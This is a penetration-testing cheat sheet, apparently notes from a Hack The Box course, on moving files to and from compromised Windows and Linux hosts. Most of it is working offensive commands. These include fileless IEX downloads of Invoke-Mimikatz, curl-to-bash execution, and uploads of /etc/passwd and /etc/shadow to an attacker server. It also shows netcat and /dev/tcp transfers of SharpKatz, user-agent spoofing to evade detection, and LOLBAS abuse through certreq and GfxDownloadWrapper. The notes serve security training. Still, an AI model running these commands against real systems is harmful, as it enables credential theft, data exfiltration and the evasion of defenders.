# Windows


##  <span style='color:lightgreen'> WEB DOWNLOADS </span>
-----

- base64 one line
```bash
cat id_rsa | base64 -w 0; echo
```
- WriteBytes to file from base64-string 
```C#
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<Base64-Here>")) // Sometimes if a ' = ' was missing at the end of the base64, it would complain about an invalid base64 length .
```

- Confirm md5

```c#
Get-FileHash <File-Path> -Algorithm md5
```

#### Powershell Web Downlaods

- Net.WebClient (DownloadFile)
```C#
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('http://172.16.1.5:8000/payload.exe','C:\Users\Public\Downloads\payload.exe')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
```

- Net.WebClient (DownloadString), Fileless method 
  IEX cmdlet to invoke the script directly from memory .
```powershell
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') # can also accept pipline input | EIX
```

#### PowerShell Invoke-WebRequest
on powershell 3.0 onwards 

```powershell
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

#### Comment issues
the Invoke-Webrequests  rely on internet explorer objects and libs, however it might return some errors, if the user hasn't used internet explorer or never completed the internet explorer setup.
```powershell
 Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX -UseBasicParsing  # To bypass the issue .
```

 ####  Work around SSL / TLS issue
 
```powershell
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

##  <span style='color:lightgreen'> SMB DOWNLOADS </span>
-----
- Unauthenticated
```css
sudo impacket-smbserver share -smb2support /tmp/smbshare
/opt/impacket/examples/smbserver.py  -smb2support CompData Password-attack/smb/
```

```shell
copy \\192.168.220.133\share\nc.exe
```
- Authenticated
```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```shell
net use n: \\192.168.220.133\share /user:test test
```

```powershell
New-PSDrive -Name "S" -Root "\\Server01\Scripts" -Persist -PSProvider "FileSystem" -Credential $cred
```


##  <span style='color:lightgreen'> FTP DOWNLOADS </span>
----
- pyftpdlib
 start anonymous session
```shell
sudo python3 -m pyftpdlib --port 21
```

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
```


##  <span style='color:lightgreen'> Powershell encodings </span>
----
 - Base64 encode
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```


##  <span style='color:lightgreen'> Powershell Web Uploads </span>
-----
- uploadserver
```python
python3 -m uploadserver
```

- upload using [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1)
 
```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://<ip>:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

- Netcat

```powershell
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

```shell
Sauuron@htb[/htb]$ nc -lvnp 8000
```


##  <span style='color:lightgreen'> SMB over HTTP </span>

-  WebDav.WebDAV
    tries to connect through SMB if there'snt it looks for HTTP .
- wsgidav, cheroot

```shell
sudo pip install wsgidav cheroot
```

```shell
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

```powershell
dir  \\192.168.127.134\DavWWWRoot
```


##  <span style='color:lightgreen'> FTP Upload </span>

```shell
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```


```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

--------

#### Powershell unzip function .zip

```powershell
Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip
{
    param([string]$zipfile, [string]$outpath)

    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}

Unzip "C:\a.zip" "C:\a"
```

------
# Linux
-------
##  <span style='color:lightgreen'> Fileless Download </span>
 - Curl
```shell
Sauuron@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

- Wget
```shell
Sauuron@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

##  <span style='color:lightgreen'> Download with Bash (/dev/tcp) </span>
- <mark style="background: navy;color:white">As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.</mark>

```c
# Connect to Target WebServer ;
Sauuron@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80

# HTTP Get Request ;
Sauuron@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

# Print the response ;
Sauuron@htb[/htb]$ cat <&3
```

- SSH Copy
```c
Sauuron@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

##  <span style='color:lightgreen'> Web Server</span>

```c
Sauuron@htb[/htb]$ python3 -m pip install --user uploadserver // Start web server
```

- Via SSL/TLS

```shell
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server' # Create Selfsigned certificate

mkdir https && cd https # Recommeded not to put the certificate in the same dir as the web upload server 

python3 -m uploadserver 443 --server-certificate /root/server.pem # Start server using the selfsigned certificate

curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure # upload files to server .
```

- Various mini web servers 

```shell
python3 -m http.server

python2.7 -m SimpleHTTPServer

php -S 0.0.0.0:8000

ruby -run -ehttpd . -p8000
```

- SSH upload
```shell
Sauuron@htb[/htb]$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
```



## <span style="color:lightgreen">Transfering Files using Code</span>
-------


- Python

```python
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

```

- php

```php
Sauuron@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

# Using fopen() module

php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Download and pip to bash

php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

```

- Ruby

```ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

- Perl

```perl
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

- Javascript

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

- Usage on Windows using cscript.exe
```shell
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

- VBScript

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

- Usage on Windows using cscript.exe

```shell
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## <span style="color:lightgreen">Upload Operations using Python3</span>

-------
- Python3

```python
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```


```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```


# Miscellaneous File Transfer Methods
----
- NetCat

```shell
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe

victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe

# From our attack machine
Sauuron@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
Sauuron@htb[/htb]$ # Example using Original Netcat
Sauuron@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
Sauuron@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe # --send-only will terminate the connection once the file is recieved
```

- Sometimes only inbounds trafic is allowed 

```shell
Sauuron@htb[/htb]$ # Example using Original Netcat
Sauuron@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe # Host on https from attack machine

# Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe # Download to comprimized machine 
```


#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
----
```shell
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```


## <span style="color:lightgreen">PowerShell Session File Transfer</span>

- Winrm
PS: Needs Administrator privleges, part of Remote management Users group, or have explicit permissions for Powershell Remoting in session configuration .

```powershell
# Test connection
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985 # Because this session has already privlegees on DATBASE01 machine so no need to provide credentials
# Create PS-SESSION
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01 
# Copy 
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```


## <span style="color:lightgreen">Remote Desktop</span>
-----

#### Mounting a Linux Folder Using rdesktop
```shell
Sauuron@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Mounting a Linux Folder Using xfreerdp

```shell
Sauuron@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

<mark style="background: #ADCCFFA6;color:#ffffff">**Note:** This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.</mark>

### <span style="color:red"> Protected File Transfers </span>
-----

- [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) 
- Encrypt files, strings ... ,etc, and  Creates a file with the same name as the file with `.aes` extension .

```powershell
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
PS C:\htb> Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt # Encrypt
PS C:\htb> Invoke-AESEncryption.ps1 -Mode Decrypt -Key "p4ssw0rd" -Path .\scan-results.txt # Decrypt
```

### <span style="color:red"> File encryption on linux </span>
-----

- OpenSSL

```shell
Sauuron@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc # Encrypt

enter aes-256-cbc encryption password:                                                         
Verifying - enter aes-256-cbc encryption password:  

# Encrypt
Sauuron@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    
enter aes-256-cbc decryption password:
```


## <span style="color:lightgreen">Secure Web Server </span>
----
<mark style="background: #FF5582A6; color : white">PS : Apache is quite critical to enable HTTP uploads, as it loves to execute anything ends in .php, while its no wear near as simple to enable PHP on  Nginx</mark>

-  Nginx - Enable PUT
```shell
Sauuron@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory # Create dir 
Sauuron@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory # Change owner ship
```

- Create nginx conf
```nginx
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

- Symlink our Site to the site-enabled Directory
```shell
Sauuron@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
Sauuron@htb[/htb]$ sudo systemctl restart nginx.service # Start nginx
```
- Check if any errors accured `/var/log/nginx/error.log`

## <span style="color:lightgreen">Living off the Land </span>
------
- LOLBAS used to preform the following functionalities 
	-   Download
	-   Upload
	-   Command Execution
	-   File Read
	-   File Write
	-   Bypasses

Search for /upload, / Download
[CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/)

- Uploading win.ini to attack box .
```shell
C:\htb> certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```


## <span style="color:red">GTFObins </span>
--------
+file Download, +file upload

```shell
Sauuron@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh # Start Server in AttackBox
Sauuron@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh # Download from the compromised machine 
```


## <span style="color:lightgreen">Detection </span>
-------
- Malicious  file transfer could identified from user-agents .


## <span style="color:lightgreen">Evading Detection </span>
-----
 - Listing user-agents
 
```powershell
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

	- Changing user-agent 

```powershell
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"
```


#### <mark style="background: #FF5582A6;color:white">Transferring File with GfxDownloadWrapper.exe</mark>
- the intel graphic dirver has a download functionality .

```powershell
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
